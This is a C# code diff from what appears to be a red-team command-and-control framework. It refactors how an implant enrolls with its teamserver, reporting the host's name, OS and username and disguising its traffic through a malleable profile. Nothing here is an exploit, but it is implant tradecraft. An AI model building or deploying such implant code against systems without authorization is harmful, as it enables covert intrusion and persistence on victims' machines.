@@ -145,60 +145,42 @@ internal sealed class Enrollment
 internal static class C2
 {
     /// <summary>
-    /// Enrolls and applies the malleable transport profile to the enroll request
-    /// (architecture.md Sec 7): the profile's User-Agent and headers are set
-    /// on the request, RequestTimeout bounds the call, and Envelope wraps the JSON
-    /// body as a single base64 string when set to "base64". The enroll path is the
-    /// caller's responsibility (use Config.ResolveEnrollUrl) so the profile's path
-    /// lands on the URL itself. A null/empty profile leaves the request identical
-    /// to the un-profiled shape.
+    /// The http(s) enroll client (the QUIC-schemed shape lives in QuicEnroll,
+    /// picked by the transport selection's enroll
+    /// dispatch): enrolls over the JSON body and applies the malleable
+    /// transport profile to the enroll request (architecture.md Sec 7) -- the
+    /// profile's User-Agent and headers are set on the request,
+    /// RequestTimeout bounds the call, and Envelope wraps the JSON body as a
+    /// single base64 string when set to "base64". The enroll path is the
+    /// caller's responsibility (use Config.ResolveEnrollUrl) so the profile's
+    /// path lands on the URL itself. A null/empty profile leaves the request
+    /// identical to the un-profiled shape. The dial's parent, class, host,
+    /// and kill-date fields carry what the teamserver records
+    /// (<see cref="EnrollDial"/> documents each).
     /// </summary>
-    /// <param name="parentImplantId">
-    /// The implant this one derives from on a child enroll (architecture.md Sec
-    /// 10.1, lateral.move); null is a top-level enroll. The teamserver resolves
-    /// and scope-checks the parent before recording the linkage.
-    /// </param>
-    /// <param name="implantClass">
-    /// The requested implant class for a child enroll (lateral.move's optional
-    /// second argument); null lets the teamserver default it. Only a child
-    /// enroll passes one.
-    /// </param>
-    /// <param name="host">
-    /// The machine facts reported at enroll -- the device identity the
-    /// teamserver records for fleet grouping. Null omits them (tests and any
-    /// caller that has nothing to report).
-    /// </param>
-    /// <param name="killDate">
-    /// The artifact's baked time fuse, reported at enroll so the teamserver's
-    /// record mirrors the artifact's own; null (an open-ended build) reports
-    /// nothing and records none.
-    /// </param>
     public static async Task<Enrollment> EnrollAsync(
-        string enrollUrl,
-        string stagerToken,
-        string? parentImplantId,
-        ECDsa privateKey,
-        X509Certificate2Collection? serverCAs,
-        TransportProfile profile,
-        string? implantClass = null,
-        HostIdentity? host = null,
-        string? killDate = null,
+        EnrollDial dial,
         CancellationToken cancellationToken = default)
     {
+        var enrollUrl = dial.EnrollUrl;
+        var privateKey = dial.PrivateKey;
+        var serverCAs = dial.ServerCAs;
+        var profile = dial.Profile;
+
         // Export the public half as a DER SubjectPublicKeyInfo -- exactly what
         // EnrollmentEndpoints reads back via ImportSubjectPublicKeyInfo.
         var pubSpki = privateKey.ExportSubjectPublicKeyInfo();
         var body = new EnrollRequest
         {
-            StagerTokenSecret = stagerToken,
-            Class = implantClass,
+            StagerTokenSecret = dial.StagerToken,
+            Class = dial.ImplantClass,
             PublicKey = Convert.ToBase64String(pubSpki),
-            ParentImplantId = parentImplantId,
-            Hostname = host?.Hostname,
-            Os = host?.Os,
-            Arch = host?.Arch,
-            Username = host?.Username,
-            KillDate = killDate,
+            ParentImplantId = dial.ParentImplantId,
+            Hostname = dial.Host?.Hostname,
+            Os = dial.Host?.Os,
+            Arch = dial.Host?.Arch,
+            Username = dial.Host?.Username,
+            KillDate = dial.KillDate,
         };
 
         using var handler = new HttpClientHandler();
@@ -258,6 +240,31 @@ internal static class C2
 
         var leafDer = Convert.FromBase64String(er.LeafCertificate
             ?? throw new EnrollRejectedException("enroll OK but missing leafCertificate"));
+        var cas = er.CaChain is { } caChain
+            ? caChain.Select(Convert.FromBase64String).ToArray()
+            : Array.Empty<byte[]>();
+        return Materialize(
+            er.ImplantId, er.EngagementId, leafDer, cas, er.ParentImplantId, privateKey);
+    }
+
+    /// <summary>
+    /// Turns an accepted enroll's wire answer into the Enrollment the run
+    /// carries: the issued leaf paired with the implant's private key (PFX
+    /// round-tripped into the store-shaped form every platform's TLS stack
+    /// presents), the CA chain trusted as the server identity, and the
+    /// lineage echo. Shared by the JSON enroll client and the QUIC frame
+    /// client -- the pairing discipline is the answer's, not the carriage's.
+    /// </summary>
+    internal static Enrollment Materialize(
+        string? implantId,
+        string? engagementId,
+        byte[] leafDer,
+        IReadOnlyList<byte[]> caChain,
+        string? parentImplantId,
+        ECDsa privateKey)
+    {
+        if (string.IsNullOrEmpty(implantId) || string.IsNullOrEmpty(engagementId))
+            throw new EnrollRejectedException("enroll OK but missing identity");
         // .NET 10 obsoleted the X509Certificate2(byte[]) ctor (SYSLIB0057); the
         // loader is the supported path for parsing a DER cert.
         var leaf = X509CertificateLoader.LoadCertificate(leafDer);
@@ -274,23 +281,17 @@ internal static class C2
             paired.Export(X509ContentType.Pfx), null);
 
         var cas = new List<X509Certificate2>();
-        if (er.CaChain is { } caChain)
-        {
-            foreach (var b64 in caChain)
-            {
-                var der = Convert.FromBase64String(b64);
-                cas.Add(X509CertificateLoader.LoadCertificate(der));
-            }
-        }
+        foreach (var der in caChain)
+            cas.Add(X509CertificateLoader.LoadCertificate(der));
 
         return new Enrollment
         {
-            ImplantId = er.ImplantId ?? string.Empty,
-            EngagementId = er.EngagementId ?? string.Empty,
+            ImplantId = implantId,
+            EngagementId = engagementId,
             Leaf = paired,
             PrivateKey = privateKey,
             CAs = cas,
-            ParentImplantId = er.ParentImplantId ?? string.Empty,
+            ParentImplantId = parentImplantId ?? string.Empty,
         };
     }
 
